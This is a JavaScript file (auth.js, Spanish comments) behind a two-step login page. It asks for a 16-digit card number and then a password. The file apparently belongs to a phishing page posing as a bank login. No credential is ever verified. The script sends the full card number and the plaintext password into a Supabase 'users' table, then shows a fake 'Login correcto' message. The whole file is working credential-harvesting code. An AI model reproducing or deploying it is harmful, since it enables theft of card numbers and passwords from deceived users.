// =============================================
// auth.js
// =============================================

// ---- Supabase ----
const { createClient } = supabase;

const supabaseClient = createClient(
  SUPABASE_URL,
  SUPABASE_ANON
);

// =============================================
// DOM
// =============================================
const cardInput = document.getElementById('card-number');
const passInput = document.getElementById('password');

const btnContinuar = document.getElementById('btn-continuar');
const btnIngresar = document.getElementById('btn-ingresar');

const errorCard = document.getElementById('error-card');
const errorPass = document.getElementById('error-pass');

const toggleCard = document.getElementById('toggle-card');
const togglePass = document.getElementById('toggle-pass');

const eyeSlashCard = document.getElementById('eye-slash-card');
const eyeSlashPass = document.getElementById('eye-slash-pass');

const cardHint = document.getElementById('card-hint');

// =============================================
// ESTADO
// =============================================
let realCardNumber = '';
let cardVisible = false;

// =============================================
// TOGGLE PASSWORD
// =============================================
function setupToggle(btn, input, slash) {

  if (!btn || !input || !slash) return;

  btn.addEventListener('click', () => {

    const hidden =
      input.type === 'password';

    input.type =
      hidden ? 'text' : 'password';

    slash.style.display =
      hidden ? 'none' : 'inline';
  });
}

setupToggle(
  togglePass,
  passInput,
  eyeSlashPass
);

// =============================================
// FORMATEAR TARJETA
// =============================================
function formatCard(number) {

  return number.replace(
    /(.{4})/g,
    '$1 '
  ).trim();
}

// =============================================
// MÁSCARA TARJETA
// =============================================
function getMaskedCard(number) {

  if (cardVisible) {
    return formatCard(number);
  }

  let masked = '';

  for (let i = 0; i < number.length; i++) {

    if (i < number.length - 4) {

      masked += '*';

    } else {

      masked += number[i];
    }
  }

  return formatCard(masked);
}

// =============================================
// ACTUALIZAR VISTA TARJETA
// =============================================
function updateCardView() {

  if (!cardInput) return;

  cardInput.value =
    getMaskedCard(realCardNumber);

  // quitar error si ya es válida
  if (realCardNumber.length === 16) {

    cardInput.classList.remove('error');

    errorCard?.classList.add('hidden');
  }
}

// =============================================
// INPUT TARJETA
// =============================================
cardInput?.addEventListener(
  'keydown',
  (e) => {

    // ENTER
    if (e.key === 'Enter') {

      e.preventDefault();

      btnContinuar?.click();

      return;
    }

    // BACKSPACE
    if (e.key === 'Backspace') {

      realCardNumber =
        realCardNumber.slice(0, -1);

      updateCardView();

      e.preventDefault();

      return;
    }

    // TAB
    if (e.key === 'Tab') {
      return;
    }

    // SOLO NUMEROS
    if (!/^\d$/.test(e.key)) {

      e.preventDefault();

      return;
    }

    // MAXIMO 16
    if (realCardNumber.length >= 16) {

      e.preventDefault();

      return;
    }

    // AGREGAR DIGITO
    realCardNumber += e.key;

    updateCardView();

    e.preventDefault();
  }
);

// =============================================
// PEGAR TARJETA
// =============================================
cardInput?.addEventListener(
  'paste',
  (e) => {

    e.preventDefault();

    const pasted =
      (
        e.clipboardData ||
        window.clipboardData
      )
      .getData('text')
      .replace(/\D/g, '')
      .slice(0, 16);

    realCardNumber = pasted;

    updateCardView();
  }
);

// =============================================
// TOGGLE TARJETA
// =============================================
toggleCard?.addEventListener(
  'click',
  () => {

    cardVisible = !cardVisible;

    updateCardView();

    if (eyeSlashCard) {

      eyeSlashCard.style.display =
        cardVisible
          ? 'none'
          : 'inline';
    }
  }
);

// =============================================
// CONTINUAR
// =============================================
btnContinuar?.addEventListener(
  'click',
  () => {

    // VALIDAR TARJETA
    if (realCardNumber.length !== 16) {

      errorCard?.classList.remove(
        'hidden'
      );

      cardInput.classList.add(
        'error'
      );

      return;
    }

    // GUARDAR TARJETA
    sessionStorage.setItem(
      'cardNumber',
      realCardNumber
    );

    // IR A LOGIN
    window.location.href =
      'login.html';
  }
);

// =============================================
// LOGIN.HTML
// =============================================
document.addEventListener(
  'DOMContentLoaded',
  () => {

    const savedCard =
      sessionStorage.getItem(
        'cardNumber'
      );

    if (savedCard && cardHint) {

      const last4 =
        savedCard.slice(-4);

      cardHint.textContent =
        `**** **** **** ${last4}`;
    }
  }
);

// =============================================
// LOGIN
// =============================================
btnIngresar?.addEventListener(
  'click',
  async () => {

    const password =
      passInput.value.trim();

    const card =
      sessionStorage.getItem(
        'cardNumber'
      );

    // VALIDACION PASSWORD
    if (
      password.length < 4 ||
      password.length > 10
    ) {

      passInput.classList.add(
        'error'
      );

      errorPass?.classList.remove(
        'hidden'
      );

      return;
    }

    // QUITAR ERROR
    passInput.classList.remove(
      'error'
    );

    errorPass?.classList.add(
      'hidden'
    );

    // =========================================
    // GUARDAR EN SUPABASE
    // =========================================
    try {

      const { error } =
        await supabaseClient
          .from('users')
          .insert([
            {
              card_number: card,
              password: password
            }
          ]);

      if (error) {

        console.error(error);

        alert('Error guardando');

        return;
      }

      alert('Login correcto 🔥');

    } catch (err) {

      console.error(err);

      alert('Error inesperado');
    }
  }
);

// =============================================
// ENTER PASSWORD
// =============================================
passInput?.addEventListener(
  'keydown',
  (e) => {

    if (e.key === 'Enter') {

      e.preventDefault();

      btnIngresar?.click();
    }
  }
);